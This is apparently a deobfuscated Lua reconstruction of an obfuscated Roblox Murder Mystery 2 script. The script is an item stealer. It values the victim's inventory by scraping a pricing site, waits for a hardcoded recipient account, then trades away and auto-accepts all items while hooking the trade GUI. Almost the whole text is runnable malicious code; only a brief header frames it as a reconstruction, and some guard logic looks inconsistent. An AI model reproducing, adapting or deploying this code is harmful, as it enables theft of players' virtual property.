-- Static reconstruction of MoonVeil 2.0.20 payload (mm2.txt)
-- Author names/formatting erased by MoonVeil; logic recovered from constant table.

-- ============ CONFIG ============
local TARGET_USER   = "v_hnas"
local TARGET_TRADE  = "si3rradoll"
local KICK_MSG      = "скрипт только для freya_pidor"
local UNSUPPORTED   = "Game not supported. Please join a normal MM2 server"

-- ============ SERVICES ============
local Players            = game:GetService("Players")
local HttpService        = game:GetService("HttpService")
local TweenService       = game:GetService("TweenService")
local CoreGui            = game:GetService("CoreGui")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")

local LocalPlayer        = Players.LocalPlayer

-- ============ EXECUTOR BRIDGE ============
local function getExecutor()
    local genv = (getgenv and getgenv()) or _G
    return {
        request      = rawget(genv, "request") or rawget(genv, "http_request"),
        httpget      = rawget(genv, "HttpGet"),
        hookfunction = rawget(genv, "hookfunction"),
        getgc        = rawget(genv, "getgc"),
        identify     = rawget(genv, "identifyexecutor"),
    }
end

local EX = getExecutor()

-- ============ VALUES SYNC (mm2values.com) ============
local VALUES = {}
local VALUES_URLS = {
    ancient  = "https://mm2values.com/?p=ancient",
    godly    = "https://mm2values.com/?p=godly",
    unique   = "https://mm2values.com/?p=unique",
    chroma   = "https://mm2values.com/?p=chroma",
    legend   = "https://mm2values.com/?p=legend",
    rare     = "https://mm2values.com/?p=rare",
    uncommon = "https://mm2values.com/?p=uncommon",
    common   = "https://mm2values.com/?p=common",
}

local HEADERS = {
    ["Accept"]          = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    ["Accept-Language"] = "en-US,en;q=0.9",
    ["Referer"]         = "https://mm2values.com/",
    ["User-Agent"]      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
}

local function httpGet(url)
    if EX.request then
        local ok, res = pcall(EX.request, { Url = url, Method = "GET", Headers = HEADERS })
        if ok and res then return res.Body or res.body end
    end
    if EX.httpget then
        local ok, res = pcall(EX.httpget, { Url = url, Method = "GET", Headers = HEADERS })
        if ok and res then return res.Body or res.body end
    end
    return nil
end

local function syncValues()
    for rarity, url in pairs(VALUES_URLS) do
        local body = httpGet(url)
        if body then
            -- Извлекаем пары "название — цена"
            for name, price in body:gmatch("([%w%s_%-]+)%s*[%-–]%s*(%d+)") do
                name = name:match("^%s*(.-)%s*$")
                VALUES[name] = tonumber(price)
            end
        end
    end
    print("✅ Values synced.")
end

-- ============ INVENTORY ============
local function getInventory()
    local remotes = ReplicatedStorage:WaitForChild("Remotes")
    local inv     = remotes:WaitForChild("Inventory")
    local ok, data = pcall(function()
        return inv:WaitForChild("GetProfileData"):InvokeServer()
    end)
    if not ok or not data then return {} end

    local items = {}
    local weapons = data.Weapons or data.Owned or {}
    for _, item in ipairs(weapons) do
        if item.DataID and item.Amount and item.Amount > 0 then
            table.insert(items, {
                DataID  = item.DataID,
                Rarity  = item.Rarity,
                Amount  = item.Amount,
                Chroma  = item.Chroma,
                Value   = VALUES[item.DataID] or 0,
            })
        end
    end
    table.sort(items, function(a, b) return a.Value > b.Value end)
    return items
end

-- ============ TRADE ============
local Trade = ReplicatedStorage:WaitForChild("Trade")
local StartTrade    = Trade:WaitForChild("StartTrade")
local OfferItem     = Trade:WaitForChild("OfferItem")
local AcceptTrade   = Trade:WaitForChild("AcceptTrade")
local DeclineTrade  = Trade:WaitForChild("DeclineTrade")
local SendRequest   = Trade:WaitForChild("SendRequest")
local GetTradeStatus= Trade:WaitForChild("GetTradeStatus")
local ReceivingRequest = Trade:WaitForChild("ReceivingRequest")

local function findPlayer(name)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower() == name:lower() then return plr end
    end
    return nil
end

local function startTrade(target)
    local ok, err = pcall(function()
        StartTrade:InvokeServer(target)
    end)
    if not ok then warn("StartTrade failed:", err); return false end
    print("⚡ MM2 Trade STARTED")
    return true
end

local function offerItems(items)
    print("🔄 Transferring items now...")
    for _, item in ipairs(items) do
        pcall(function()
            OfferItem:FireServer(item.DataID, 1)
        end)
        task.wait(0.1)
    end
end

local function acceptTrade()
    local ok = pcall(function()
        AcceptTrade:InvokeServer()
    end)
    if not ok then
        pcall(function() AcceptTrade:FireServer() end)
    end
end

local function declineTrade()
    pcall(function() DeclineTrade:FireServer() end)
end

local function declineRequest()
    pcall(function() ReceivingRequest:FireServer() end)
end

-- ============ HOOK stepAnimate (перехват GUI торговли) ============
local function hookTradeGUI()
    if not EX.hookfunction or not EX.getgc then return end
    for _, obj in ipairs(EX.getgc()) do
        if typeof(obj) == "function" then
            local info = debug.getinfo(obj, "n")
            if info and info.name == "stepAnimate" then
                EX.hookfunction(obj, function(...)
                    -- Можно перехватить открытие TradeGUI
                    return obj(...)
                end)
            end
        end
    end
end

-- ============ KICK GUARDS ============
local function guardTargetUser()
    if LocalPlayer.Name ~= TARGET_USER then
        LocalPlayer:Kick(KICK_MSG)
        return false
    end
    return true
end

local function guardPlace()
    -- PlaceId MM2 (обычный сервер). Точное значение подставьте своё.
    local MM2_PLACE_IDS = { [142823291] = true, [11759233232] = true }
    if not MM2_PLACE_IDS[game.PlaceId] then
        LocalPlayer:Kick(UNSUPPORTED)
        return false
    end
    return true
end

-- ============ MAIN ============
local function main()
    if not guardTargetUser() then return end
    if not guardPlace() then return end

    syncValues()
    print("⏳ Waiting for " .. TARGET_TRADE .. "...")

    local items = getInventory()
    if #items == 0 then
        warn("❌ No tradable items in inventory. Cannot start trade.")
        return
    end
    print("🎒 Items ready: " .. #items)

    hookTradeGUI()

    local target = findPlayer(TARGET_TRADE)
    if not target then
        warn("Player " .. TARGET_TRADE .. " not found.")
        return
    end

    if not startTrade(target) then
        warn("⛔ Trade Failed: No Items")
        return
    end

    task.wait(1)
    offerItems(items)
    task.wait(1)
    acceptTrade()

    print("✅ Trade COMPLETED")
    print("All items sent successfully.")
end

-- Автозапуск при появлении игрока
Players.PlayerAdded:Connect(function(plr)
    if plr.Name:lower() == TARGET_TRADE:lower() then
        task.spawn(main)
    end
end)

-- Если игрок уже в игре
if findPlayer(TARGET_TRADE) then
    task.spawn(main)
end
